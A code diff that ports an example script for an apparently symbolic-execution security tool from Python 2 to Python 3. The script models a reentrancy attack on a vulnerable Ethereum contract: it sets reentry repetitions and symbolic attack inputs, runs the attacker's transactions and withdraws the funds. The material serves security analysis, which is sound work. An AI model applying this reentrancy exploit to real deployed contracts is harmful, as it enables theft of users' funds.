@@ -83,38 +83,37 @@ exploit_account = m.solidity_create_contract(exploit_source_code, owner=attacker
 
 
 #User deposits all in contract
-print "[+] user deposited some."
+print("[+] user deposited some.")
 contract_account.addToBalance(value=100000000000000000)
 
-print "[+] Initial world state"
-print "     attacker_account %x balance: %d"% (attacker_account, m.get_balance(attacker_account))
-print "     exploit_account %x balance: %d"%  (exploit_account, m.get_balance(exploit_account))
-print "     user_account %x balance: %d"%  (user_account, m.get_balance(user_account))
-print "     contract_account %x balance: %d"%  (contract_account, m.get_balance(contract_account))
+print("[+] Initial world state")
+print("     attacker_account %x balance: %d"% (attacker_account.address, m.get_balance(attacker_account.address)))
+print("     exploit_account %x balance: %d"%  (exploit_account.address, m.get_balance(exploit_account.address)))
+print("     user_account %x balance: %d"%  (user_account.address, m.get_balance(user_account.address)))
+print("     contract_account %x balance: %d"%  (contract_account.address, m.get_balance(contract_account.address)))
 
 
-
-print "[+] Setup the exploit"
+print("[+] Setup the exploit")
 exploit_account.set_vulnerable_contract(contract_account)
 
-print "\t Setting 30 reply reps"
+print("\t Setting 30 reply reps")
 exploit_account.set_reentry_reps(30)
 
-print "\t Setting reply string"
-exploit_account.set_reentry_attack_string(m.SByte(4))
+print("\t Setting reply string")
+exploit_account.set_reentry_attack_string(m.make_symbolic_buffer(4))
 
 #Attacker is
-print "[+] Attacker first transaction"
-exploit_account.proxycall(m.SByte(4), value=m.SValue)
+print("[+] Attacker first transaction")
+exploit_account.proxycall(m.make_symbolic_buffer(4), value=m.make_symbolic_value())
 
-print "[+] Attacker second transaction" 
-exploit_account.proxycall(m.SByte(4))
+print("[+] Attacker second transaction") 
+exploit_account.proxycall(m.make_symbolic_buffer(4))
 
-print "[+] The attacker destroys the exploit contract and profit" 
+print("[+] The attacker destroys the exploit contract and profit") 
 exploit_account.get_money()
 
 #Let seth know we are not sending more transactions so it can output 
 # info about running states and global statistics
 m.finalize()
-print "[+] Look for results in %s"% m.workspace
+print("[+] Look for results in %s"% m.workspace)
 
